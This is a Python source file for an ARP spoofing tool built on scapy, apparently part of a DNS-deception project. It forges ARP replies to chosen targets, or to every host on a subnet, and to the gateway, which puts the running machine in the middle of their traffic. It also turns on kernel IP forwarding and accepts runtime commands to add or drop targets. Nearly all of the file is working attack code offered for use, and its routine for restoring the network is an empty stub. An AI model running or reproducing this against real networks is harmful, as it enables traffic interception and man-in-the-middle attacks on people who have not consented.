#!/usr/bin/env python3

__author__ = 'foxtrot_charlie'
__licence__ = 'GPLv2'


import sys
import os
import threading
import logging
import queue
import time
from scapy.all import *


import utils


logger = logging.getLogger("ARPSPOOFER")
logger.setLevel(logging.DEBUG)
fh = logging.FileHandler('dnsdeceiver.log')
formatter = logging.Formatter("%(name)s; %(asctime)s; %(levelname)s; %(message)s", "%Y-%m-%d %H:%M:%S")
fh.setFormatter(formatter)
logger.addHandler(fh)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# DO NOT CHANGE THIS VALUES! USE CONFIG INSTEAD!
DEFAULT_GATEWAY = '192.168.0.1'
DEFAULT_NETWORK = "192.168.0.0/24"
INTERVAL = 100
CommandQueue = queue.Queue()
counter = 0


class ARPspoofer(threading.Thread):
    """
    ARPspoofer class is used to provide ARP spoofing capability
    ARPspoofer can work in two modes. One mode provides ability
    to spoof ARP responses only for a specific target. Another
    option is to spoof whole ARP traffic in the network.
    """
    def __init__(self, event, queue, config={}):
        """"""
        threading.Thread.__init__(self)
        self.event = event
        self.gw = None
        self.network = None
        self.delay = None
        self.interface = None
        self.targets = []
        self.ip_mac = {}
        self.myself = None
        self.queue = queue
        logger.info("Initializing ARPspoofer...")
        if os.getuid():
            logger.error("Run me as root!")
            sys.exit(-1)
        logger.warning("Used kernel ipv4 forwarding feature.")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        logger.info("Kernel IPv4 forwarding enabled")
        self.__config_load(config)


    def __config_load(self, config={}):
        """
        Loading config from config dict
        :param config: dictionary of settings
        :return: None
        """
        logger.info("Loading config...")
        print(config)
        self.gw = config.get('gateway', None)
        if not self.gw:
            logger.critical("IP of gateway not specified! Using default one: {}".format(DEFAULT_GATEWAY))
            self.gw = DEFAULT_GATEWAY

        mac = utils.arpping(self.gw)
        while mac is None:
            logger.debug('Cannot obtain MAC addr of the gateway. Make sure {} is correct!'.format(self.gw))
            mac = utils.arpping(self.gw)
        self.ip_mac[self.gw] = mac
        logger.debug('Gateway MAC addr: {}'.format(mac))

        self.network = config.get('network', None)
        if self.network is None:
            logger.debug('Using default network! {}'.format(DEFAULT_NETWORK))
            self.network = DEFAULT_NETWORK

        self.targets = config.get('target', None)
        if not self.targets:
            logger.debug('No explicit targets found! Calculating from the net!')
            self.targets = utils.get_hosts(self.network)
        logger.debug('Targets: {}'.format(self.targets))
        for t in self.targets:
            mac = utils.arpping(t)
            if mac is not None:
                logger.debug('Target {} has MAC: {}'.format(t, mac))
                self.ip_mac[t] = mac

    def __spoof(self):
        """
        Main spoofing function. Iterates through the targets lists and sends two packets each iteration.
        ARP response to target and gateway, putting this machine in the middle. Basics of MITM attack via
        ARP spoofing
        :return: None
        """
        global counter
        for ip, mac in self.ip_mac.items():
            if ip == self.gw:
                continue
            pkt = ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac)
            if counter == INTERVAL:
                logger.debug('Sending ARP spoof message! Target: {}'.format(ip))
                logger.debug('{}'.format(pkt.summary()))
            send(pkt, verbose=0)

            pkt = ARP(op=2, pdst=self.gw, psrc=ip, hwdst=self.ip_mac[self.gw])
            if counter == INTERVAL:
                logger.debug('Sending ARP spoof message to GW with target: {}'.format(ip))
                logger.debug('{}'.format(pkt.summary()))
            send(pkt, verbose=0)

    def __execute_cmd(self, cmd):
        """
        Helper function executing commands. Creates changes runtime.
        :param cmd: touple of arguments
        :return: None
        """
        if not isinstance(cmd, list):
            logger.critical('Unknown command! {}'.format(cmd))

        elif len(cmd) < 1:
            logger.critical('Unknown command! {}'.format(cmd))

        elif len(cmd) == 1:

            if cmd[0].strip() == 'p':
                logger.debug('Pausing...')

            elif cmd[0].strip() == 'r':
                logger.debug('Running...')

            else:
                logger.critical('Unknown command!')

        elif len(cmd) == 2:

            if cmd[0].strip() == 'a':
                logger.debug('Adding entry {} to target queue!'.format(cmd[1]))
                self.targets.append(cmd[1])

            elif cmd[0].strip() == 'd':
                logger.debug('Removing entry {} from target queue!'.format(cmd[1]))
                try:
                    self.targets.remove(cmd[1])
                except ValueError:
                    logger.warning('Input: {} not in target list! Cannot remove!'.format(cmd[1]))

        else:
            logger.critical('Unknown command!')

    def __spoof_loop(self):
        """
        Main spoof loop function. Invokes spoofing function until threading-end event is set.
        It also resolves IP addresses to MAC using arpping from utils.
        :return:
        """
        global counter
        try:
            while not self.event.is_set():
                if counter == INTERVAL:
                    logger.debug('Iterating...')
                else:
                    counter += 1
                while not self.queue.empty() and not self.event.is_set():
                    cmd = self.queue.get()
                    logger.debug('New command: {}'.format(cmd))
                    self.__execute_cmd(cmd)

                for t in self.targets:
                    if t not in self.ip_mac:
                        mac = utils.arpping(t)
                        self.ip_mac[t] = mac

                self.__spoof()
                time.sleep(0.10)
                if counter == INTERVAL:
                    counter = 0
        except KeyboardInterrupt:
            logger.info('Exiting by KeyboardInterrupt')
        finally:
            print("arpspoofer exiting!")

    def run(self):
        """
        Run method overrides threading.run method for parallel execution.
        :return:
        """
        self.__spoof_loop()
        try:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        except AttributeError:
            pass
        return

    def __restore_network(self):
        pass


if __name__ == '__main__':
    q = queue.Queue()
    q.put(['a', '192.168.0.16'])
    e = threading.Event()
    AS = ARPspoofer(event=e, queue=q)
    AS.run()
    logger.critical('Quiting arpspoofer')